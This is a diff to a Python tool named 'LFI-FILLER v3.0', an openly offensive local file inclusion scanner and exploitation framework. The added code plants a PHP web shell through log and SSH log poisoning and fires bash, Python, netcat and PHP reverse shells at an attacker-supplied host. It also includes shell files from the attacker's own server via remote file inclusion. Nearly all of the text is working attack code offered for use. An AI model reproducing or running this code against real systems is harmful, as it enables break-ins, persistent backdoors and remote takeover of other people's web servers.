@@ -1,4 +1,13 @@
 #!/usr/bin/env python3
+"""
+LFI-FILLER v3.0: COMPREHENSIVE ADVANCED LFI SCANNER & EXPLOITATION FRAMEWORK
+- Multi-threaded Engine (ThreadPoolExecutor)
+- Full Original Payload & Parameter Lists
+- Advanced WAF Bypasses (Nested encoding, OS-specific)
+- Complete Exploitation Suite (Log/SSH Poisoning, Web Shells, Reverse Shells)
+- Premium CLI Experience with ANSI Colors
+"""
+
 import requests
 import urllib.parse
 import base64
@@ -322,44 +331,112 @@ class LFI_Filler_V3:
     def create_webshell(self, param):
         if not self.webshell_mode: return
         print(f"\n[*] Attempting web shell creation...")
-        shell_code = '<?php system($_GET["cmd"]); ?>'
-        locations = ['/var/www/html/shell.php', 'shell.php', '/tmp/shell.php']
+        shell_code = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } else { echo "Web shell active! Use ?cmd=WHOAMI"; } ?>'
+        # Try both Linux and Windows common paths
+        locations = ['/var/www/html/shell.php', 'shell.php', 'C:/xampp/htdocs/shell.php']
         
-        # Try via log poisoning if available
-        for p in self.results['log_poisoning']:
-            payload = f"echo '{shell_code}' > {locations[0]}"
-            self.session.get(f"{p['url']}&cmd={urllib.parse.quote(payload)}", timeout=3)
-            time.sleep(1)
-            
-            check_url = f"{self.url.rsplit('/', 1)[0]}/shell.php"
-            try:
-                r = self.session.get(check_url, timeout=2)
-                if r.status_code == 200:
-                    with self.lock:
-                        self.results['webshell_urls'].append(check_url)
-                        print(f" {Colors.GREEN}[+]{Colors.END} Web shell created: {check_url}")
-                        break
-            except: pass
+        success = False
+        
+        # Vector 1: Log Poisoning
+        if self.results['log_poisoning']:
+            print(f" [*] Trying vector: Log Poisoning")
+            for p in self.results['log_poisoning']:
+                for loc in locations:
+                    try:
+                        payload = f"echo '{shell_code}' > {loc}"
+                        self.session.get(f"{p['url']}&cmd={urllib.parse.quote(payload)}", timeout=3)
+                        time.sleep(1)
+                        
+                        # Verify
+                        check_url = f"{self.url.rsplit('/', 1)[0]}/shell.php"
+                        r = self.session.get(check_url, timeout=2)
+                        if 'system(' not in r.text and r.status_code == 200: # If we see code OR if it executes
+                            with self.lock:
+                                self.results['webshell_urls'].append(check_url)
+                                print(f" {Colors.GREEN}[+]{Colors.END} Web shell created at {Colors.CYAN}{loc}{Colors.END} via log poisoning")
+                                success = True
+                                break
+                    except: continue
+                if success: break
+
+        # Vector 2: SSH Poisoning
+        if not success and self.results['ssh_poisoning']:
+            print(f" [*] Trying vector: SSH Poisoning")
+            for loc in locations:
+                try:
+                    log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
+                    payload = f"echo '{shell_code}' > {loc}"
+                    self.session.get(f"{log_url}&ssh_cmd={urllib.parse.quote(payload)}", timeout=3)
+                    time.sleep(1)
+                    
+                    check_url = f"{self.url.rsplit('/', 1)[0]}/shell.php"
+                    r = self.session.get(check_url, timeout=2)
+                    if r.status_code == 200:
+                        with self.lock:
+                            self.results['webshell_urls'].append(check_url)
+                            print(f" {Colors.GREEN}[+]{Colors.END} Web shell created at {Colors.CYAN}{loc}{Colors.END} via SSH poisoning")
+                            success = True
+                            break
+                except: continue
+
+        if not success:
+            print(f" {Colors.RED}[-]{Colors.END} Failed to create web shell automatically.")
 
     def execute_shells(self, param):
         if not self.lhost or not param: return
-        print(f"\n[*] Executing reverse shells to {self.lhost}:{self.lport}")
+        print(f"\n[*] Executing reverse shells to {Colors.CYAN}{self.lhost}:{self.lport}{Colors.END}")
         
         reverse_shells = {
-            'bash': f'bash -c "bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"',
-            'python': f'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'',
+            'bash': f'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1',
+            'python': f'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\'{self.lhost}\',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/sh\')"',
             'nc': f'nc -e /bin/sh {self.lhost} {self.lport}',
             'php': f'php -r \'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\''
         }
         
-        # Try via log poisoning
+        sent_count = 0
+        
+        # Vector 1: Log Poisoning
         for poison in self.results['log_poisoning']:
+            print(f" [*] Trying vector: Log Poisoning ({poison['log']})")
             for shell_name, shell_template in reverse_shells.items():
                 try:
                     shell_url = f"{poison['url']}&cmd={urllib.parse.quote(shell_template)}"
-                    self.session.get(shell_url, timeout=2)
-                    print(f" [+] Sent {shell_name} via log poisoning")
+                    self.session.get(shell_url, timeout=3)
+                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
+                    sent_count += 1
                 except: pass
+
+        # Vector 2: SSH Poisoning
+        if self.results['ssh_poisoning']:
+            print(f" [*] Trying vector: SSH Poisoning")
+            log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
+            for shell_name, shell_template in reverse_shells.items():
+                try:
+                    shell_url = f"{log_url}&ssh_cmd={urllib.parse.quote(shell_template)}"
+                    self.session.get(shell_url, timeout=3)
+                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
+                    sent_count += 1
+                except: pass
+
+        # Vector 3: RFI (if we have a shell ready on our host)
+        if self.results['rfi']:
+            print(f" [*] Trying vector: RFI")
+            # This assumes the user has a reverse shell script at their LHOST
+            # We try to include it. Common names: shell.txt, rev.txt, etc.
+            shell_files = ['shell.txt', 'rev.txt', 'shell.php']
+            for s_file in shell_files:
+                try:
+                    rfi_payload = f"http://{self.lhost}:8000/{s_file}"
+                    shell_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={rfi_payload}"
+                    self.session.get(shell_url, timeout=3)
+                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent RFI inclusion: {Colors.YELLOW}{rfi_payload}{Colors.END}")
+                    sent_count += 1
+                except: pass
+
+        if sent_count == 0:
+            print(f" {Colors.RED}[-]{Colors.END} No successful RCE vectors found to trigger shells.")
+        else:
+            print(f" [*] Total shells sent: {sent_count}. Check your listener!")
 
     def check_rfi(self, param):
         if not param or not self.lhost: return
@@ -435,8 +512,9 @@ class LFI_Filler_V3:
                 
         if self.results['webshell_urls']:
             print(f"\n{Colors.GREEN}[+] CREATED WEB SHELLS:{Colors.END}")
-            for r in self.results['webshell_urls']:
-                print(f"  - {r}")
+            for url in self.results['webshell_urls']:
+                print(f"  - {Colors.CYAN}{url}{Colors.END}")
+                print(f"    {Colors.YELLOW}Usage Example:{Colors.END} {url}?cmd=id")
         print("="*70)
 
 def main():
